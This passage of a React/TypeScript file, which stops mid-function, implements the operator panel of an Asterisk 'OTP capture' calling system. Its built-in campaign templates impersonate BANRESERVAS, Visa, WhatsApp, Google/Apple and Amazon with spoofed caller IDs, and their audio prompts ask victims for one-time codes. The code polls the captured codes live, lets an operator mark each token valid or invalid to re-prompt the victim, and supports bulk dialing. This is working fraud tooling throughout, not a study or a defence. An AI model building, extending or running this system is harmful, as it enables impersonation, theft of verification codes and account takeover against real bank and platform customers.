import React, { useState, useEffect, useRef } from 'react';
import { PjsipExtension, CarrierTrunk, CapturedOtpRecord, AudioPrompt } from '../types';
import {
  Rocket,
  PhoneCall,
  PhoneOff,
  PhoneForwarded,
  ShieldAlert,
  ShieldCheck,
  Radio,
  CheckCircle2,
  CheckCircle,
  XCircle,
  Phone,
  Clock,
  Copy,
  Check,
  RefreshCw,
  Trash2,
  Download,
  Flame,
  KeyRound,
  AlertCircle,
  Building2,
  CreditCard,
  MessageSquare,
  Lock,
  ShoppingBag,
  Sliders,
  Play,
  Pause,
  RotateCcw,
  Volume2,
  UploadCloud,
  FileAudio,
  Music,
  Plus,
  Mic,
  Square,
  Sparkles,
  HelpCircle,
  UserCheck,
  Terminal,
  Pencil,
  Edit3,
  Save,
  X,
  Settings2,
  Zap,
  ArrowRight,
} from 'lucide-react';

export interface CampaignAudioConfig {
  introAudioPath: string;    // Bienvenida / Alerta
  promptAudioPath: string;   // Solicitud OTP o Press 1
  agentAudioPath: string;    // Previo a transferir a asesor
  successAudioPath: string;  // Confirmación / Éxito
}

export interface CampaignEntity {
  id: string;
  name: string;
  subtitle: string;
  icon: 'building' | 'card' | 'message' | 'lock' | 'shopping' | 'sliders';
  color: string;
  defaultCallerName?: string;
  defaultCallerNum?: string;
  introAudioPath: string;    // Saludo / Alerta
  promptAudioPath: string;   // Solicitud OTP
  agentAudioPath: string;    // Transferencia a Asesor (Opción 1 - "Un momento por favor...")
  successAudioPath: string;  // Validación Exitosa
  waitAudioPath?: string;    // Espera
}

export type ServiceCampaignKey = string;

interface ProductionOperationsTabProps {
  extensions: PjsipExtension[];
  carriers: CarrierTrunk[];
  audios?: AudioPrompt[];
  onAddAudio?: (audio: AudioPrompt) => void;
  onTriggerSync: () => void;
  isSyncing: boolean;
}

export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = ({
  extensions,
  carriers,
  audios = [],
  onAddAudio,
  onTriggerSync,
  isSyncing,
}) => {
  // Mode selection: individual direct launch vs ivr action tab vs bulk list
  const [productionMode, setProductionMode] = useState<'single' | 'ivr_action' | 'bulk'>('single');

  // Single launch state
  const [targetNumber, setTargetNumber] = useState('16104803845');
  const [targetName, setTargetName] = useState('');
  const [selectedService, setSelectedService] = useState<ServiceCampaignKey>('bank');
  const [customServiceName, setCustomServiceName] = useState('Servicio Financiero');
  const [callFlowMode, setCallFlowModeState] = useState<'otp' | 'press1' | 'hybrid'>(() => {
    try {
      const saved = localStorage.getItem('ast20_call_flow_mode');
      if (saved === 'otp' || saved === 'press1' || saved === 'hybrid') {
        return saved;
      }
    } catch (_) {}
    return 'press1';
  });

  const setCallFlowMode = (mode: 'otp' | 'press1' | 'hybrid') => {
    setCallFlowModeState(mode);
    try {
      localStorage.setItem('ast20_call_flow_mode', mode);
      fetch('/api/asterisk/action/set-default', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ mode }),
      }).catch(() => {});
    } catch (_) {}
  };

  const [agentExtension, setAgentExtension] = useState('1001');

  // Initial predefined campaign templates
  const initialCampaignEntities: CampaignEntity[] = [
    {
      id: 'bank',
      name: 'Banco / Antifraude',
      subtitle: 'Transf. desconocida',
      icon: 'building',
      color: 'emerald',
      defaultCallerName: 'BANRESERVAS',
      defaultCallerNum: '8099602110',
      introAudioPath: 'custom/banrearreglado',
      promptAudioPath: 'custom/solicitar_codigo_otp',
      agentAudioPath: 'custom/conectar_asesor_banco',
      successAudioPath: 'custom/operacion_bloqueada_exito',
    },
    {
      id: 'card',
      name: 'Tarjeta de Crédito',
      subtitle: 'Cargo no reconocido',
      icon: 'card',
      color: 'sky',
      defaultCallerName: 'VISA SEGURIDAD',
      defaultCallerNum: '18005550199',
      introAudioPath: 'custom/alerta_cargo_tarjeta',
      promptAudioPath: 'custom/solicitar_otp_tarjeta',
      agentAudioPath: 'custom/conectar_asesor_tarjetas',
      successAudioPath: 'custom/tarjeta_protegida',
    },
    {
      id: 'whatsapp',
      name: 'WhatsApp / Telegram',
      subtitle: 'Migración de cuenta',
      icon: 'message',
      color: 'emerald',
      defaultCallerName: 'WHATSAPP VERIF',
      defaultCallerNum: '18004567890',
      introAudioPath: 'custom/alerta_migracion_whatsapp',
      promptAudioPath: 'custom/solicitar_codigo_sms',
      agentAudioPath: 'custom/conectar_soporte_tecnico',
      successAudioPath: 'custom/verificacion_exitosa',
    },
    {
      id: 'google',
      name: 'Google / Apple ID',
      subtitle: 'Alerta de seguridad',
      icon: 'lock',
      color: 'amber',
      defaultCallerName: 'SECURITY ALERT',
      defaultCallerNum: '18005550122',
      introAudioPath: 'custom/alerta_seguridad_google',
      promptAudioPath: 'custom/solicitar_codigo_google',
      agentAudioPath: 'custom/conectar_soporte_cuentas',
      successAudioPath: 'custom/acceso_restringido_exito',
    },
    {
      id: 'amazon',
      name: 'Amazon / Envíos',
      subtitle: 'Autorización pedido',
      icon: 'shopping',
      color: 'orange',
      defaultCallerName: 'AMAZON FRAUD',
      defaultCallerNum: '18005550133',
      introAudioPath: 'custom/alerta_compra_amazon',
      promptAudioPath: 'custom/solicitar_codigo_amazon',
      agentAudioPath: 'custom/conectar_soporte_pedidos',
      successAudioPath: 'custom/pedido_cancelado_exito',
    },
    {
      id: 'custom',
      name: 'Personalizado',
      subtitle: 'Configuración libre',
      icon: 'sliders',
      color: 'purple',
      defaultCallerName: 'SERVICIO CLIENTE',
      defaultCallerNum: '',
      introAudioPath: 'custom/banrearreglado',
      promptAudioPath: 'custom/solicitar_codigo_otp',
      agentAudioPath: 'custom/conectar_asesor_banco',
      successAudioPath: 'custom/operacion_bloqueada_exito',
    },
  ];

  // Campaign entities state persisted in localStorage
  const [campaignEntities, setCampaignEntities] = useState<CampaignEntity[]>(() => {
    try {
      const saved = localStorage.getItem('prod_campaign_entities_v3');
      if (saved) {
        const parsed = JSON.parse(saved);
        if (Array.isArray(parsed) && parsed.length > 0) {
          return parsed;
        }
      }
    } catch (e) {}
    return initialCampaignEntities;
  });

  // State to track if the selected entity has been explicitly saved/locked
  const [isEntitySaving, setIsEntitySaving] = useState(false);
  const [isEntitySaved, setIsEntitySaved] = useState(false);

  const handleSaveAndLockCurrentEntity = async () => {
    const current = campaignEntities.find((e) => e.id === selectedService) || campaignEntities[0];
    if (!current) return;
    setIsEntitySaving(true);
    try {
      // 1. Persist current list & active selection in localStorage
      localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(campaignEntities));
      localStorage.setItem('prod_selected_service_v3', current.id);
      
      // 2. Sync to AstDB for Asterisk
      await fetch('/api/asterisk/audio/sync-defaults', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          intro: current.introAudioPath,
          prompt: current.promptAudioPath,
          wait: 'custom/un_momento_validando_informacion',
          success: current.successAudioPath,
          agent: current.agentAudioPath,
          destination: targetNumber.trim() || '16104803845',
        }),
      });

      setIsEntitySaved(true);
      setAudioSyncFeedback(`✓ Guión "${current.name}" guardado y bloqueado permanentemente en Asterisk AstDB.`);
      setTimeout(() => {
        setIsEntitySaved(false);
        setAudioSyncFeedback(null);
      }, 4000);
    } catch (err: any) {
      setAudioSyncFeedback(`Guión guardado localmente.`);
      setTimeout(() => setAudioSyncFeedback(null), 3000);
    } finally {
      setIsEntitySaving(false);
    }
  };

  // Modal for editing an entity and its assigned audios
  const [editingEntity, setEditingEntity] = useState<CampaignEntity | null>(null);
  const [isEntityModalOpen, setIsEntityModalOpen] = useState(false);

  // Quick inline rename states directly on cards
  const [inlineRenamingId, setInlineRenamingId] = useState<string | null>(null);
  const [inlineNameVal, setInlineNameVal] = useState('');
  const [inlineSubtitleVal, setInlineSubtitleVal] = useState('');
  // State to track entity delete confirmation
  const [confirmDeleteId, setConfirmDeleteId] = useState<string | null>(null);

  const handleStartInlineRename = (ent: CampaignEntity, e?: React.MouseEvent) => {
    if (e) e.stopPropagation();
    setInlineRenamingId(ent.id);
    setInlineNameVal(ent.name);
    setInlineSubtitleVal(ent.subtitle || '');
  };

  const handleSaveInlineRename = (entityId: string, e?: React.MouseEvent | React.KeyboardEvent) => {
    if (e) e.stopPropagation();
    if (!inlineNameVal.trim()) {
      setInlineRenamingId(null);
      return;
    }
    setCampaignEntities((prev) => {
      const updated = prev.map((ent) => {
        if (ent.id === entityId) {
          return {
            ...ent,
            name: inlineNameVal.trim(),
            subtitle: inlineSubtitleVal.trim(),
          };
        }
        return ent;
      });
      try {
        localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(updated));
      } catch (err) {}
      return updated;
    });
    setInlineRenamingId(null);
  };

  const handleCancelInlineRename = (e?: React.MouseEvent | React.KeyboardEvent) => {
    if (e) e.stopPropagation();
    setInlineRenamingId(null);
  };

  // Derived campaign audio configurations for backward compatibility
  const campaignAudios: Record<string, CampaignAudioConfig> = campaignEntities.reduce((acc, ent) => {
    acc[ent.id] = {
      introAudioPath: ent.introAudioPath,
      promptAudioPath: ent.promptAudioPath,
      agentAudioPath: ent.agentAudioPath,
      successAudioPath: ent.successAudioPath,
    };
    return acc;
  }, {} as Record<string, CampaignAudioConfig>);

  // Helper to verify if an audio path exists physically in Asterisk
  const verifyAudioOnAsterisk = async (audioPath: string): Promise<boolean> => {
    if (!audioPath) return false;
    try {
      const res = await fetch(`/api/asterisk/audio/verify?path=${encodeURIComponent(audioPath)}`, {
        method: 'HEAD',
      });
      return res.status === 200;
    } catch {
      return false;
    }
  };

  // Update specific audio slot for an entity
  const handleUpdateCampaignAudio = async (
    service: string,
    slot: keyof CampaignAudioConfig,
    audioPath: string
  ) => {
    const cleanPath = audioPath.trim();
    setCampaignEntities((prev) => {
      const updated = prev.map((ent) => {
        if (ent.id === service) {
          return { ...ent, [slot]: cleanPath };
        }
        return ent;
      });
      try {
        localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(updated));
      } catch (e) {}
      return updated;
    });

    // If currently selected, notify and auto-sync in background to Asterisk AstDB
    if (selectedService === service) {
      const current = campaignEntities.find((e) => e.id === service);
      const payload = {
        intro: slot === 'introAudioPath' ? cleanPath : (current?.introAudioPath || ''),
        prompt: slot === 'promptAudioPath' ? cleanPath : (current?.promptAudioPath || ''),
        wait: 'custom/un_momento_validando_informacion',
        success: slot === 'successAudioPath' ? cleanPath : (current?.successAudioPath || ''),
        agent: slot === 'agentAudioPath' ? cleanPath : (current?.agentAudioPath || ''),
        destination: targetNumber.trim() || '16104803845',
      };
      
      try {
        await fetch('/api/asterisk/audio/sync-defaults', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });
        setAudioSyncFeedback(`✓ Audio asignado y sincronizado con Asterisk: ${cleanPath || 'Estándar'}`);
        setTimeout(() => setAudioSyncFeedback(null), 3500);
      } catch {
        setAudioSyncFeedback(`Aviso: Audio guardado localmente.`);
      }
    }
  };

  // Save complete entity from modal
  const handleSaveEntity = async (updatedEntity: CampaignEntity) => {
    setCampaignEntities((prev) => {
      const exists = prev.some((e) => e.id === updatedEntity.id);
      let next: CampaignEntity[];
      if (exists) {
        next = prev.map((e) => (e.id === updatedEntity.id ? updatedEntity : e));
      } else {
        next = [...prev, updatedEntity];
      }
      try {
        localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(next));
      } catch (e) {}
      return next;
    });
    setIsEntityModalOpen(false);
    setEditingEntity(null);

    // Apply caller ID if this is or becomes the active service
    if (selectedService === updatedEntity.id) {
      if (updatedEntity.defaultCallerName) setCallerIdName(updatedEntity.defaultCallerName);
      if (updatedEntity.defaultCallerNum) setCallerIdNum(updatedEntity.defaultCallerNum);

      // Auto-sync audios to AstDB
      try {
        await fetch('/api/asterisk/audio/sync-defaults', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            intro: updatedEntity.introAudioPath,
            prompt: updatedEntity.promptAudioPath,
            wait: 'custom/un_momento_validando_informacion',
            success: updatedEntity.successAudioPath,
            agent: updatedEntity.agentAudioPath,
            destination: targetNumber.trim() || '16104803845',
          }),
        });
        setAudioSyncFeedback(`✓ Guión "${updatedEntity.name}" guardado y aplicado en Asterisk AstDB.`);
      } catch {
        setAudioSyncFeedback(`✓ Guión "${updatedEntity.name}" guardado.`);
      }
      setTimeout(() => setAudioSyncFeedback(null), 4000);
    }
  };

  // Select an entity and sync its attributes
  const handleSelectEntity = async (entity: CampaignEntity) => {
    setSelectedService(entity.id);
    if (entity.defaultCallerName) setCallerIdName(entity.defaultCallerName);
    if (entity.defaultCallerNum) setCallerIdNum(entity.defaultCallerNum);

    // Auto-sync to AstDB so both dialplan 8888 and outgoing calls use its assigned audios
    try {
      await fetch('/api/asterisk/audio/sync-defaults', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          intro: entity.introAudioPath,
          prompt: entity.promptAudioPath,
          wait: 'custom/un_momento_validando_informacion',
          success: entity.successAudioPath,
          agent: entity.agentAudioPath,
          destination: targetNumber.trim() || '16104803845',
        }),
      });
      setAudioSyncFeedback(`✓ Guión activo: "${entity.name}" sincronizado con Asterisk.`);
      setTimeout(() => setAudioSyncFeedback(null), 3000);
    } catch {}
  };

  // Add new entity
  const handleAddNewEntity = () => {
    const newId = 'custom_' + Date.now();
    const newEntity: CampaignEntity = {
      id: newId,
      name: 'Nueva Entidad / Banco',
      subtitle: 'Alerta de Seguridad',
      icon: 'building',
      color: 'emerald',
      defaultCallerName: 'BANCO OFICIAL',
      defaultCallerNum: '',
      introAudioPath: 'custom/banrearreglado',
      promptAudioPath: 'custom/solicitar_codigo_otp',
      agentAudioPath: 'custom/conectar_asesor_banco',
      successAudioPath: 'custom/operacion_bloqueada_exito',
    };
    setEditingEntity(newEntity);
    setIsEntityModalOpen(true);
  };

  // Delete entity
  const handleDeleteEntity = (entityId: string) => {
    if (campaignEntities.length <= 1) return;
    setCampaignEntities((prev) => {
      const next = prev.filter((e) => e.id !== entityId);
      try {
        localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(next));
      } catch (e) {}
      return next;
    });
    if (selectedService === entityId) {
      const remaining = campaignEntities.filter((e) => e.id !== entityId);
      if (remaining.length > 0) {
        handleSelectEntity(remaining[0]);
      }
    }
    setIsEntityModalOpen(false);
    setEditingEntity(null);
    setConfirmDeleteId(null);
  };

  // Reset to factory defaults
  const handleResetEntities = () => {
    if (confirm('¿Restablecer todos los guiones y asignaciones de audio a los valores de fábrica?')) {
      setCampaignEntities(initialCampaignEntities);
      try {
        localStorage.removeItem('prod_campaign_entities_v3');
      } catch (e) {}
      const first = initialCampaignEntities[0];
      handleSelectEntity(first);
    }
  };

  // Audio preview playback in browser
  const [playingAudioKey, setPlayingAudioKey] = useState<string | null>(null);
  const audioPlayerRef = useRef<HTMLAudioElement | null>(null);

  const handleTogglePlayAudio = (audioPath: string, keyIdentifier: string) => {
    if (!audioPath) return;

    if (playingAudioKey === keyIdentifier) {
      if (audioPlayerRef.current) {
        audioPlayerRef.current.pause();
      }
      setPlayingAudioKey(null);
      return;
    }

    if (audioPlayerRef.current) {
      audioPlayerRef.current.pause();
    }

    // Try finding dataUrl from registered audios
    const foundAudio = audios.find((a) => a.asteriskPath === audioPath);
    if (foundAudio && foundAudio.dataUrl) {
      const player = new Audio(foundAudio.dataUrl);
      audioPlayerRef.current = player;
      setPlayingAudioKey(keyIdentifier);
      player.play().catch((err) => console.log('Audio playback error:', err));
      player.onended = () => setPlayingAudioKey(null);
    } else {
      // Audio is on server disk, stream via API
      const cleanName = audioPath.replace(/^custom\//, '').replace(/\.wav$/, '');
      const player = new Audio(`/api/asterisk/audio/stream/${cleanName}`);
      audioPlayerRef.current = player;
      setPlayingAudioKey(keyIdentifier);
      player.play().catch(() => {
        // Fallback demo sound if streaming is unavailable
        const demoSoundUrl = `https://actions.google.com/sounds/v1/alarms/beep_short.ogg`;
        const fallbackPlayer = new Audio(demoSoundUrl);
        audioPlayerRef.current = fallbackPlayer;
        fallbackPlayer.play().catch(() => {});
        fallbackPlayer.onended = () => setPlayingAudioKey(null);
      });
      player.onended = () => setPlayingAudioKey(null);
    }
  };

  // Quick Upload Audio Modal State
  const [isQuickUploadOpen, setIsQuickUploadOpen] = useState(false);
  const [quickUploadSlot, setQuickUploadSlot] = useState<keyof CampaignAudioConfig>('introAudioPath');
  const [quickUploadName, setQuickUploadName] = useState('');
  const [quickUploadFile, setQuickUploadFile] = useState<File | null>(null);
  const [quickUploadDataUrl, setQuickUploadDataUrl] = useState<string | null>(null);
  const [isRecordingQuick, setIsRecordingQuick] = useState(false);
  const [quickRecordTime, setQuickRecordTime] = useState(0);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const audioChunksRef = useRef<Blob[]>([]);
  const recordTimerRef = useRef<any>(null);

  // Bulk launch state
  const [bulkNumbersText, setBulkNumbersText] = useState('');
  const [bulkQueue, setBulkQueue] = useState<string[]>([]);
  const [isBulkRunning, setIsBulkRunning] = useState(false);
  const [bulkProgress, setBulkProgress] = useState({ total: 0, completed: 0, current: '' });

  // Real-time Active Call HUD State
  const [activeCall, setActiveCall] = useState<{
    isActive: boolean;
    number: string;
    name?: string;
    service: string;
    status: 'dialing' | 'ringing' | 'in_ivr' | 'otp_captured' | 'transferred' | 'ended';
    capturedOtp?: string;
    otpStatus?: 'valid' | 'invalid' | 'pending';
    validationNote?: string;
    duration: number;
    channel?: string;
  } | null>(null);

  // History of captured OTPs
  const [otpRecords, setOtpRecords] = useState<CapturedOtpRecord[]>([]);
  const [isLoadingRecords, setIsLoadingRecords] = useState(false);
  const [isLaunching, setIsLaunching] = useState(false);
  const [launchFeedback, setLaunchFeedback] = useState<{ text: string; type: 'success' | 'error' } | null>(null);
  const [isSyncingAudios, setIsSyncingAudios] = useState(false);
  const [audioSyncFeedback, setAudioSyncFeedback] = useState<string | null>(null);
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [isCopiedVpsCmd, setIsCopiedVpsCmd] = useState(false);

  const activeCarrier = carriers.length > 0 ? carriers[0].name : 'televox';
  const outboundCid = carriers.length > 0 ? carriers[0].outboundCallerId : '+18005550199';

  // Dynamic CallerID fields directly configurable by agent
  const [callerIdNum, setCallerIdNum] = useState('+18005550199');
  const [callerIdName, setCallerIdName] = useState('Seguridad Bancaria');

  // Auto-sync CallerID values when agentExtension changes
  useEffect(() => {
    const ext = extensions.find((e) => e.extension === agentExtension);
    if (ext) {
      if (ext.callerIdNum) {
        setCallerIdNum(ext.callerIdNum);
      }
      if (ext.callerIdName) {
        setCallerIdName(ext.callerIdName);
      }
    }
  }, [agentExtension, extensions]);

  // Ensure default action is synced to Asterisk on mount
  useEffect(() => {
    fetch('/api/asterisk/action/set-default', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ mode: callFlowMode }),
    }).catch(() => {});
  }, []);

  const activeSelectedEntity = campaignEntities.find((e) => e.id === selectedService) || campaignEntities[0];
  const serviceLabel = activeSelectedEntity ? `${activeSelectedEntity.name} (${activeSelectedEntity.subtitle})` : 'Banco / Antifraude';

  const durationTimerRef = useRef<any>(null);
  const [liveCapturedAlert, setLiveCapturedAlert] = useState<CapturedOtpRecord | null>(null);
  const [showLiveMonitor, setShowLiveMonitor] = useState<boolean>(true);
  const lastAlertKeyRef = useRef<string>('');
  const activeCallRef = useRef(activeCall);
  const validRecordIdsRef = useRef<Set<string>>(new Set());
  const dismissedAlertKeysRef = useRef<Set<string>>(new Set());

  useEffect(() => {
    activeCallRef.current = activeCall;
  }, [activeCall]);

  // Polling captured OTPs from Asterisk backend with fast real-time response
  const fetchCapturedOtps = async (forceFresh = false) => {
    try {
      const res = await fetch(forceFresh ? '/api/asterisk/otp/records?fresh=1' : '/api/asterisk/otp/records');
      const data = await res.json();
      if (data.success && Array.isArray(data.records)) {
        setOtpRecords(data.records);

        // Detectar si hay un código nuevo para alertar al agente
        if (data.records.length > 0) {
          const newest = data.records[0];
          const recordKey = `${newest.id}_${newest.otp}_${newest.status}`;

          const isDecided =
            newest.status === 'valid' ||
            newest.status === 'invalid' ||
            validRecordIdsRef.current.has(newest.id) ||
            (newest.otp && validRecordIdsRef.current.has(newest.otp)) ||
            (newest.number && validRecordIdsRef.current.has(newest.number));

          const isDismissed =
            dismissedAlertKeysRef.current.has(newest.id) ||
            dismissedAlertKeysRef.current.has(newest.otp) ||
            (newest.number && dismissedAlertKeysRef.current.has(newest.number));

          if (isDecided || isDismissed) {
            // Cuando el código ya fue decidido (válido/inválido) o descartado por el usuario, no mostrar banner de alerta
            setLiveCapturedAlert(null);
            if (isDecided) {
              setActiveCall((prev) => {
                if (prev && prev.name?.includes('Cliente Transferido')) {
                  return null;
                }
                if (prev && prev.capturedOtp === newest.otp) {
                  return {
                    ...prev,
                    capturedOtp: undefined,
                    status: prev.status === 'otp_captured' ? 'connected' : prev.status,
                    otpStatus: newest.status as any,
                  };
                }
                return prev;
              });
            }
          } else {
            // Mantener el banner de alerta solo si está realmente pendiente de validación y no fue descartado
            setLiveCapturedAlert((prev) => {
              if (!prev || prev.id !== newest.id || prev.otp !== newest.otp || prev.status !== newest.status) {
                return newest;
              }
              return prev;
            });

            // Tono de notificación auditivo solo cuando llega un código nuevo o cambia de estado
            if (newest.otp && lastAlertKeyRef.current !== recordKey) {
              lastAlertKeyRef.current = recordKey;

              try {
                const audioCtx = new (window.AudioContext || (window as any).webkitAudioContext)();
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                osc.type = 'triangle';
                osc.frequency.setValueAtTime(880, audioCtx.currentTime);
                osc.frequency.exponentialRampToValueAtTime(1760, audioCtx.currentTime + 0.35);
                gain.gain.setValueAtTime(0.25, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.35);
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.start();
                osc.stop(audioCtx.currentTime + 0.35);
              } catch (e) {}
            }

            // CRÍTICO: Actualizar el HUD activo ÚNICAMENTE si ya hay una llamada en curso lanzada por el usuario.
            // NUNCA crear llamadas fantasma para códigos de sesiones pasadas para evitar que el HUD aparezca y desaparezca.
            setActiveCall((prev) => {
              if (prev && prev.isActive) {
                if (prev.capturedOtp === newest.otp && prev.otpStatus === newest.status) {
                  return prev; // Mismo estado, sin re-render
                }
                return {
                  ...prev,
                  capturedOtp: newest.otp,
                  status: 'otp_captured',
                  otpStatus: (newest.status as any) || prev.otpStatus || 'pending',
                };
              }
              // No hay llamada activa: no recrear HUD
              return prev;
            });
          }
        } else {
          setLiveCapturedAlert(null);
        }
      }
    } catch (err) {
      console.warn('Error fetching OTP records:', err);
    }
  };

  // Agent OTP verification handler (Valid / Invalid buttons decided by Agent)
  const handleVerifyOtp = async (
    status: 'valid' | 'invalid',
    targetOtp?: string,
    targetNum?: string,
    recordId?: string
  ) => {
    const num = targetNum || (activeCall ? activeCall.number : '');
    const otp = targetOtp || (activeCall ? activeCall.capturedOtp : '');

    if (status === 'valid') {
      if (recordId) validRecordIdsRef.current.add(recordId);
      if (otp) validRecordIdsRef.current.add(otp);
      if (num) validRecordIdsRef.current.add(num);

      // Quitar inmediatamente el aviso de código capturado en tiempo real
      setLiveCapturedAlert(null);

      // Quitar del HUD de llamada activa la sección de dígitos en tiempo real
      if (activeCall) {
        if (activeCall.name?.includes('Cliente Transferido')) {
          setActiveCall(null);
        } else {
          setActiveCall((prev) =>
            prev
              ? {
                  ...prev,
                  capturedOtp: undefined,
                  status: prev.status === 'otp_captured' ? 'connected' : prev.status,
                  otpStatus: 'valid',
                  validationNote:
                    '✓ Token VÁLIDO aprobado. ¡Transfiriendo llamada de vuelta a tu extensión de agente (1001)!',
                }
              : null
          );
        }
      }
    } else {
      if (activeCall) {
        setActiveCall((prev) =>
          prev
            ? {
                ...prev,
                otpStatus: status,
                validationNote:
                  '✕ Token marcado como INVÁLIDO. El IVR le ha solicitado automáticamente un nuevo token al cliente...',
              }
            : null
        );
      }
      if (liveCapturedAlert) {
        setLiveCapturedAlert((prev) => (prev ? { ...prev, status } : null));
      }
    }

    // Immediate UI update in list (permanece visible en el monitor del agente y en el registro histórico)
    setOtpRecords((prev) =>
      prev.map((r) =>
        (recordId && r.id === recordId) || (num && r.number.includes(num)) || (otp && r.otp === otp)
          ? { ...r, status }
          : r
      )
    );

    try {
      await fetch('/api/asterisk/otp/decision', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: recordId, number: num, otp, status }),
      });
    } catch (e) {
      console.warn('Error syncing OTP decision:', e);
    }

    // Si es INVÁLIDO: Solicitar automáticamente nuevo código y dejar la pantalla lista para capturar el nuevo token
    if (status === 'invalid') {
      setTimeout(() => {
        if (activeCall) {
          setActiveCall((prev) =>
            prev
              ? {
                  ...prev,
                  capturedOtp: undefined,
                  otpStatus: 'pending',
                  validationNote: 'Esperando nuevo token digitado por el cliente...',
                }
              : null
          );
        }
      }, 1500);
    }
  };

  // Reset captured OTP in HUD to request a new code from client on the same call
  const handleResetOtpCapture = async (number?: string) => {
    const num = number || (activeCall ? activeCall.number : '');
    if (activeCall) {
      setActiveCall((prev) =>
        prev
          ? {
              ...prev,
              capturedOtp: undefined,
              otpStatus: 'pending',
              validationNote: 'Se solicitó nuevo código al cliente en llamada. Esperando que digite...',
            }
          : null
      );
    }
    try {
      await fetch('/api/asterisk/otp/decision', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ number: num, status: 'pending', action: 'request_retry' }),
      });
    } catch (e) {}
  };

  // Cargar configuración de audios persistida desde Asterisk AstDB al inicializar la pestaña
  useEffect(() => {
    const fetchAsteriskAudioConfig = async () => {
      try {
        const res = await fetch('/api/asterisk/audio/config');
        const data = await res.json();
        if (data.success && data.audios) {
          setCampaignEntities((prev) => {
            const updated = prev.map((ent) => {
              // Si es la entidad activa o la default, actualizar con los audios reales de Asterisk AstDB
              if (ent.id === selectedService || ent.id === 'custom') {
                return {
                  ...ent,
                  introAudioPath: data.audios.intro || ent.introAudioPath,
                  promptAudioPath: data.audios.prompt || ent.promptAudioPath,
                  agentAudioPath: data.audios.agent || ent.agentAudioPath,
                  successAudioPath: data.audios.success || ent.successAudioPath,
                };
              }
              return ent;
            });
            try {
              localStorage.setItem('prod_campaign_entities_v3', JSON.stringify(updated));
            } catch (e) {}
            return updated;
          });
        }
      } catch (err) {}
    };

    fetchAsteriskAudioConfig();
  }, []);

  useEffect(() => {
    fetchCapturedOtps();
    const interval = setInterval(fetchCapturedOtps, 2000);
    return () => clearInterval(interval);
  }, []);

  // Polling de canales activos de Asterisk para detectar llamadas manuales (ej. marcando 7777 u 8888 desde extensión 1002/1001)
  useEffect(() => {
    const pollLiveChannels = async () => {
      try {
        const res = await fetch('/api/asterisk/live/channels');
        const data = await res.json();
        if (data.success && Array.isArray(data.channels)) {
          // Buscar si hay algún canal interactuando con 7777, 8888 o con el IVR
          const ivrChannel = data.channels.find((ch: any) => {
            const exten = String(ch.extension || ch.exten || '');
            const context = String(ch.context || '');
            const channel = String(ch.channel || '');
            const callerId = String(ch.callerId || ch.callerid || '');
            return (
              exten.includes('7777') ||
              exten.includes('8888') ||
              context.includes('captura') ||
              context.includes('ivr') ||
              channel.includes('7777') ||
              channel.includes('8888') ||
              (callerId && (callerId === '1002' || callerId === '1001') && (context.includes('ivr') || exten === '7777' || exten === '8888' || exten === 's'))
            );
          });

          if (ivrChannel) {
            const detectedNumber = ivrChannel.callerId || ivrChannel.callerid || '8888';
            setActiveCall((prev) => {
              if (prev && prev.isActive) {
                // Si ya está activo, mantener estado y actualizar canal si faltaba
                return {
                  ...prev,
                  channel: prev.channel || ivrChannel.channel,
                };
              }
              // Si no estaba activo, activar automáticamente el HUD
              return {
                isActive: true,
                number: detectedNumber === '8888' ? 'Prueba Local Ext. 8888' : detectedNumber,
                name: `Prueba Softphone Ext. ${detectedNumber}`,
                service: selectedService || 'bank',
                status: 'in_ivr',
                duration: 0,
                channel: ivrChannel.channel,
              };
            });
          } else if (activeCall?.isActive && activeCall.duration >= 5 && Array.isArray(data.channels)) {
            // Si la llamada estaba activa pero ya no figura en ningún canal de Asterisk
            const queryClean = activeCall.number.replace(/[^0-9]/g, '');
            const channelStillAlive = data.channels.some((c: any) => {
              const chStr = (c.channel || '') + (c.extension || '') + (c.callerId || '') + (c.data || '');
              return (activeCall.channel && c.channel?.includes(activeCall.channel)) || (queryClean && chStr.includes(queryClean));
            });
            if (!channelStillAlive && activeCall.status !== 'ended') {
              setActiveCall((prev) => (prev ? { ...prev, isActive: false, status: 'ended' } : null));
            }
          }
        }
      } catch (e) {}
    };

    pollLiveChannels();
    const chanInterval = setInterval(pollLiveChannels, 2500);
    return () => clearInterval(chanInterval);
  }, [selectedService, activeCall?.isActive, activeCall?.channel, activeCall?.number, activeCall?.duration, activeCall?.status]);

  // Monitoreo en tiempo real del estado de la llamada activa (Corte de cliente y Contestadora automática / Buzón)
  useEffect(() => {
    if (!activeCall?.isActive || activeCall.status === 'ended') return;

    const watcherInterval = setInterval(async () => {
      try {
        const queryNum = activeCall.number.replace(/[^0-9]/g, '');
        if (!queryNum) return;
        const res = await fetch(`/api/asterisk/call/status?number=${encodeURIComponent(queryNum)}`);
        const data = await res.json();
        if (data.success && data.call) {
          const callState = data.call;
          if (callState.status === 'machine') {
            setActiveCall((prev) =>
              prev
                ? {
                    ...prev,
                    isActive: false,
                    status: 'ended',
                  }
                : null
            );
            setLaunchFeedback({
              text: `📞 Contestadora automática o buzón de voz detectado en ${activeCall.number}. Asterisk colgó la llamada y el sistema se cerró automáticamente.`,
              type: 'error',
            });
          } else if (callState.status === 'ended') {
            setActiveCall((prev) =>
              prev
                ? {
                    ...prev,
                    isActive: false,
                    status: 'ended',
                  }
                : null
            );
